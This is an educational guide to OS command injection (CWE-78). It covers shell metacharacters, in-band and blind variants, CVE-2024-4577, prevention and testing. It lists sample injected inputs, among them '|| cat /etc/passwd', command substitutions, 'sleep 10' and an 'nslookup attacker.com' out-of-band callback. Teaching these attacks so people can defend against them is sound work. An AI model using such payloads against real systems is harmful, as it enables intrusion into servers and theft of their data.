---
id: command-injection
title: Command Injection (CWE-78)
---

# Command Injection (CWE-78): A Detailed Guide

This guide explains one of the most dangerous web vulnerabilities: OS Command Injection. We will break down what it is, how it works, and the best ways to prevent it.

## 1. What is OS Command Injection?

**The Core Idea:** An OS Command Injection is an attack where a hacker tricks a web application into running commands on the server's operating system (OS).

Imagine a website has a feature that lets you look up information. You type in a username, and the server runs a command like `list files for 'username'`. The application is _supposed_ to only take a username as input. However, a command injection attack happens when an attacker provides a specially crafted input that includes not just a username, but also a malicious OS command.

**A Simple Analogy:**

1. **The Application:** A vulnerable script on a server is like a personal assistant who is a bit too trusting. You can ask it, "Please get me the file for 'John'."
    
2. **The Attacker:** An attacker tells the assistant, "Please get me the file for 'John' **; and also delete all the other files**."
    
3. **The Vulnerability:** Because the assistant doesn't question the second part of the request, it blindly passes the entire command to the operating system.
    
4. **The Result:** The OS executes both commands: it gets John's file and then proceeds to delete everything else.

A successful attack can give the attacker complete control over the server.

## 2. Why is Command Injection So Dangerous?

This vulnerability is critical because it can lead to a full system compromise.

- **Arbitrary Command Execution:** The attacker isn't limited to a few actions; they can run _any_ command that the web server user has permission to run.
    
- **Remote Access:** Attackers can exploit this vulnerability through a simple web form or URL, meaning they don't need direct login access to the server.
    
- **Privilege Escalation:** If the web application is running with high privileges (e.g., as the 'root' or 'administrator' user), the attacker's commands will also run with those same high privileges, giving them total control.
    
- **Complete System Takeover:** This can lead to:
    
    - Data theft from the server and its databases.
    - Installation of malware or backdoors for persistent access.
    - Modification or deletion of critical files.
    - Using the server to attack other systems.

## 3. How Does it Work? The Power of Metacharacters

The trick behind command injection is the use of **shell metacharacters**. These are special characters that the operating system's command line (or "shell") interprets as instructions to perform a certain action, like combining two commands.

An attacker includes these characters in their input to fool the application into executing more than one command.

| Metacharacter | Name | Purpose | Example (Attacker's Input) |
| --- | --- | --- | --- |
| **;** | Semicolon | Command Separator: Executes commands sequentially. | `127.0.0.1 ; ls -la` |
| **&&** | Ampersands | AND: Executes the second command only if the first succeeds. | `127.0.0.1 && whoami` |
| **\|\|** | Pipes | OR: Executes the second command only if the first fails. | `127.0.0.1 \|\| cat /etc/passwd` |
| `` ` `` | Backticks | Command Substitution: Executes the command inside the backticks and uses its output as input to the main command. | `` `cat /etc/passwd` `` |
| **$( )** | Dollar Parens | Command Substitution: Same as backticks. | `$(whoami)` |

## 4. Variants of Command Injection

There are two main ways attackers carry out these attacks, based on whether they can see the output of their command.

### a. In-band (Classic) Command Injection

This is the most direct type. The attacker can see the output of their injected command directly in the web application's response.

- **Example:** A website has a tool to `ping` an IP address. The code takes the IP and runs `ping -c 3 [IP_ADDRESS]`.
    
- **Attack:** The attacker inputs `127.0.0.1 ; whoami`.
    
- **Result:** The server runs `ping -c 3 127.0.0.1 ; whoami`. The webpage first shows the ping results, and then right below it, it shows the output of the `whoami` command (e.g., `www-data`), proving the attack worked.

### b. Out-of-band (Blind) Command Injection

This is a stealthier version where the application does not display the output of the command. The attacker has to use other methods to confirm their command was executed.

- **Time-Based Method:** The attacker injects a command that causes a time delay, like `sleep 10`. If the website takes an extra 10 seconds to load, they know the injection was successful.
    
    - **Attack Input:** `127.0.0.1 && sleep 10`
        
- **DNS-Based Method:** The attacker injects a command that forces the server to make a network request to a domain the attacker controls.
    
    - **Example:** `127.0.0.1 && nslookup attacker.com`
    - **Confirmation:** The attacker monitors their DNS server. If they see a lookup request from the target server, they know the command injection worked.

## 5. Real-World Example: PHP CGI Vulnerability (CVE-2024-4577)

A well-known PHP vulnerability demonstrated how command injection can occur in default PHP configurations when query parameters are passed to the CGI handler without proper escaping.

## 6. How to Prevent Command Injection

The most effective defenses include:

- **Avoid Calling the Shell:** Never pass user input to shell functions like `exec()`, `system()`, `shell_exec()`, or backticks. These are the primary vectors for command injection.
    
- **Input Validation:** Use a strict whitelist of allowed characters. For example, if a field should only contain numbers, reject anything that isn't a digit.
    
- **Use Safe APIs:** Rather than executing shell commands, utilize structured APIs and language-specific functions that are designed for secure command execution.

- **Escape Input Properly:** If you must pass user input to a shell, use language-specific escaping functions. For example, in PHP use `escapeshellarg()` and `escapeshellcmd()`, but this is not a complete solution.

- **Principle of Least Privilege:** Run the web application with the minimum necessary permissions. If the application doesn't need to write to certain directories or access certain files, it shouldn't have permission to do so.

- **Sandboxing:** Use OS-level restrictions (containers, virtual machines, chroot jails) to limit what an attacker can do even if they achieve command execution.

## 7. Testing for Command Injection

- **Manual Testing:** Try common metacharacters and time-based delays.
    
- **Automated Scanning:** Use Burp Suite or OWASP ZAP.
    
- **Code Review:** Inspect source code for dangerous function calls.
